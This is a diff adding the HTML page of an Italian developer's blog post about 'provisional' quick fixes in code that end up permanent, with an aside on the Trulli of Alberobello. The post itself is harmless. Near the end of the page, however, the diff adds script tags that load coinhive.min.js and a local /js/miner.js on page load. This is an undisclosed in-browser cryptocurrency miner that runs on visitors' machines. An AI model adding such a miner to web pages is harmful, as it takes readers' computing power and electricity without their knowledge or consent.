@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<script>
+		var host = "michelenasti.com";
+		if ((host == window.location.host) && (window.location.protocol != "https:"))
+			window.location.protocol = "https";
+	</script>
+	
+	<title>Non c'é nulla di più definitivo di una scelta provvisoria - Michele Nasti's blog</title>
+	<meta name="description" content="Negli ultimi due giorni ho lavorato a un  refactoring della webapp che stiamo sviluppando e, mentre sistemavamo tutti i problemi che incontravamo lungo la strada, abbiamo trovato tante scelte provvisorie fatte dagli sviluppatori di sei mesi fa (alcune anche di un anno fa). Ci faceva sorridere il fatto che alcuni div fossero addirittura etichettati come provvisorio e invece sono resistiti tutto questo tempo.
+
+" />
+	<meta name="keywords" content="metodologie, pezzotto, sviluppo" />  
+	<meta http-equiv="last-modified" content="2017-09-19 10:17:10 +0200" /> 
+	<!--<noscript>-->
+	<link rel="stylesheet" href="/css/skel.css" />
+	<link rel="stylesheet" href="/css/style.css" />
+	<link rel="stylesheet" href="/css/style-xlarge.css" />
+	<link rel="stylesheet" href="/css/colorful.css" />
+	<link rel="stylesheet" href="/css/social.css" />
+	<link rel="stylesheet" href="/node_modules/animate.css/animate.min.css" />
+	<meta name="google-site-verification" content="wpVjnRuXV99CAZxjYBzZgKbJm-8_tdLPrlP43u9zhV0" /> <!-- facebook Open Graph Metadatas -->
+<meta content="your_facebook_app_id" property="fb:app_id">
+<meta content="" property="og:site_name">
+
+
+  <meta content="Non c'é nulla di più definitivo di una scelta provvisoria" property="og:title">
+
+
+
+  <meta content="article" property="og:type">
+
+
+
+  <meta content="I'm a full stack Developer with an eye for the web." property="og:description">
+
+
+
+  <meta content="https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/" property="og:url">
+
+
+
+  <meta content="2015-12-11T09:34:51+01:00" property="article:published_time">
+  <meta content="https://www.facebook.com/micnasti/" property="article:author">
+
+
+
+<meta content="/img/logo-high-resolution.png" property="og:image">
+
+
+
+  
+  <meta content="metodologie" property="article:tag">
+  
+  <meta content="pezzotto" property="article:tag">
+  
+  <meta content="sviluppo" property="article:tag">
+  
+
+
+<!-- Twitter cards metadatas -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@vdaubry">
+<meta name="twitter:creator" content="@micnasti">
+
+  <meta name="twitter:title" content="Non c'é nulla di più definitivo di una scelta provvisoria">
+
+
+  <meta name="twitter:url" content="https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/">
+
+
+
+  <meta name="twitter:description" content="I'm a full stack Developer with an eye for the web.">
+
+
+
+	<!--</noscript>-->
+	<!--[if lte IE 8]><link rel="stylesheet" href="/css/ie/v8.css" /><![endif]-->
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88764277-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<link rel="stylesheet" href="/css/prism.css" />
+</head>
+
+<body id="top">
+
+	<header id="header">
+	<a href="#" class="image avatar"><img src="/images/michele_nasti.jpg" alt="michele nasti volto" /></a>
+	<h1><strong><a href="/">Michele Nasti</a></strong><br /> Full-stack developer <br> with an eye for the web<br>
+	</h1>
+<a href="/chi-sono-michele-nasti/">Chi sono</a> | 
+<a href="/talks-conferences/">Talks &amp; Conferences</a> | 
+<a href="/archives/">Archives</a>
+
+</header> <div id="main">
+	<article>
+		<header class="major">
+			<h1 class="post-title"><a href="/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/">Non c'é nulla di più definitivo di una scelta provvisoria</a></h1>
+			<p class="post-meta">Dec 11, 2015 • musikele</p>
+		</header>
+
+		<section>
+
+			<p>Negli ultimi due giorni ho lavorato a un  refactoring della webapp che stiamo sviluppando e, mentre sistemavamo tutti i problemi che incontravamo lungo la strada, abbiamo trovato tante scelte <em>provvisorie</em> fatte dagli sviluppatori di sei mesi fa (alcune anche di un anno fa). Ci faceva sorridere il fatto che alcuni div fossero addirittura etichettati come <code>provvisorio</code> e invece sono resistiti tutto questo tempo.</p>
+
+<p>Voi lo sapete che meno refactoring si fa sul codice meglio é, tuttavia ogni tanto un refactoring é indispensabile altrimenti  i poveri sviluppatori impazziscono 🙂</p>
+
+<p>Questo problema delle scelte provvisorie che poi diventano definitive travalica i confini dell’informatica: mi vengono in mente i <a href="https://it.m.wikipedia.org/wiki/Trullo">Trulli di Alberobello</a>, costruiti senza malta (quindi con la sola pietra) affinché potessero essere facilmente smontabili in caso di ispezione da parte del Regno delle Due Sicilie. Ai tempi si pagava una tassa per ogni nuovo insediamento!</p>
+
+<p>Tornando all’informatica, lo sviluppatore che deve scegliere tra due o più strade ha generalmente due opzioni: farlo bene (e ci metterà del tempo), o farlo subito (col classico <em>pezzotto</em>). Non ci crederete ma, sulla base della mia esperienza, <strong>é il management che spinge verso soluzioni veloci</strong> che non resistono alla prova del tempo! Purtroppo spesso l’ansia di completare un’attività (e di rispettare la tabella di marcia) fa dire ai nostri capi che <em>poi si vede</em>, ignorando i costi a breve e lungo termine.</p>
+
+<p>A breve termine può darsi che ciò che é stato fatto si debba rifare: quando si ha un feedback rapido, come con metodologie Agili, potrebbe accadere proprio questo. E il tempo speso per realizzarlo raddoppia. (c’é da dire che spesso manco il cliente sa cosa vuole, e solo quando vede una soluzione riesca a dire “ma io non volevo questo”!).</p>
+
+<p>A lunghissimo termine invece, non é detto che la nostra soluzione sia sempre rifattorizzabile: spesso il codice potrebbe gestire parti così oscure del programma che toccandolo (o anche solo guardandolo) potrebbe rompersi qualcosa che non di sospettava nemmeno che fosse collegata. E allora che si fa? Un altro pezzotto! Alla lunga questo pregiudica la manutenibilità e la risoluzione dei bug.</p>
+
+<p><em>Infine, ci sono pezzotti che sono veri e propri capolavori. Quando ne ho trovati sono rimasto sorpreso da tanto ingegno (mi viene in mente la variabile _pezzott++).__ In quei casi quasi dispiace dover modificare o mettere mano al codice: del resto, _se funziona, perché cambiarlo? 🙂</em></p>
+ 
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/&t=" title="Share on Facebook" target="_blank" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/) + '&t=' + encodeURIComponent(document.title)); return false;"><img alt="Share on Facebook" src="/images/icons/Facebook.svg"></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/&text=Non c'é nulla di più definitivo di una scelta provvisoria:%20https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/&via=micnasti" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(Non c'é nulla di più definitivo di una scelta provvisoria) + ':%20'  + encodeURIComponent(https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/)); return false;"><img alt="Tweet" src="/images/icons/Twitter.svg"></a></li>
+  <li><a href="https://plus.google.com/share?url=https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/" target="_blank" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=' + encodeURIComponent(https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/)); return false;"><img alt="Share on Google+" src="/images/icons/Google+.svg"></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/&title=Non c'é nulla di più definitivo di una scelta provvisoria&summary=&source=https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/) + '&title=' +  encodeURIComponent(document.title)); return false;"><img alt="Share on LinkedIn" src="/images/icons/LinkedIn.svg"></a></li>
+</ul>
+
+		</section>
+
+		<section>
+			 <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+    	//var disqus_identifier = 'https://michelenasti.com';
+			//var disqus_url = '';
+			var disqus_url = 'https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/';
+			var disqus_identifier = 'https://michelenasti.com/2015/12/non-ce-nulla-di-piu-definitivo-di-una-scelta-provvisoria/';
+
+    };
+    
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//michele-nastis-blog.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> 
+		</section>
+
+		<footer>
+			<br> Altri articoli:
+			<br>
+			<div class="row">
+				
+
+				<div class="6u 12u(small) excerpt" id="previousArticle">
+					<header>
+						<h2><a href="/2015/12/ho-provato-la-prossima-versione-di-eclipse-che-web-based-per-voi/">Ho provato la prossima versione di Eclipse (web-based) per voi</a></h2>
+					</header>
+					<section>
+						<p>E’ uscita una <a href="https://eclipse.org/che/">nuova versione di Eclipse</a>, denominata <strong>Eclipse Che</strong> (forse realizzata a Cuba?) che promette di essere un’autentica rivoluzione: non a caso, il titolo del sito è</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="/2015/12/ho-provato-la-prossima-versione-di-eclipse-che-web-based-per-voi/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				 
+
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
+					<header>
+						<h2><a href="/2015/12/essere-bravi-colleghi-evitando-di-committare-cazzate/">Essere bravi colleghi evitando di committare cazzate</a></h2>
+					</header>
+					<section>
+						<p>Ogni volta che qualcuno committa qualcosa di rotto, gli altri dev del team perdono tempo per capire cosa è successo e come risolvere. <strong>Se io fossi il boss mi assicurerei che i miei sviluppatori seguano i passi che descrivo nell’articolo, altrimenti gli pagherei lo stipendio per perdere tempo riparando danni altrui. </strong></p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="//2015/12/essere-bravi-colleghi-evitando-di-committare-cazzate/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				
+			</div>
+		</footer>
+
+	</article>
+
+</div>
+<script src="/js/infinite-scroll.js"></script>
+
+	<!-- Footer -->
+	<footer id="footer">
+	<ul class="icons">
+
+		
+		<li>
+			<a href="https://github.com/musikele" class="icon fa-github">
+				<span class="label">GitHub</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://twitter.com/micnasti" class="icon fa-twitter">
+				<span class="label">Twitter</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://linkedin.com/in/michelenasti" class="icon fa-linkedin">
+				<span class="label">LinkedIn</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://plus.google.com/MicheleNasti" class="icon fa-google-plus">
+				<span class="label">Google+</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://www.facebook.com/musikele" class="icon fa-facebook">
+				<span class="label">Facebook</span>
+			</a>
+		</li>
+		  
+	</ul>
+	<ul class="copyright">
+		<li>&copy; Michele Nasti</li>
+		<li>Based on <a href="http://html5up.net/strata">STRATA</a> theme</li>
+	</ul>
+</footer>
+	<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
+	<script src="/js/jquery.min.js"></script>
+	<script src="/js/jquery.poptrox.min.js"></script>
+	<script src="/js/skel.min.js"></script>
+	<script src="/js/init.js"></script>
+	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/miner.js"></script>
+	<!-- <script src="/js/badge.js"></script> -->
+</body>
+
+</html>
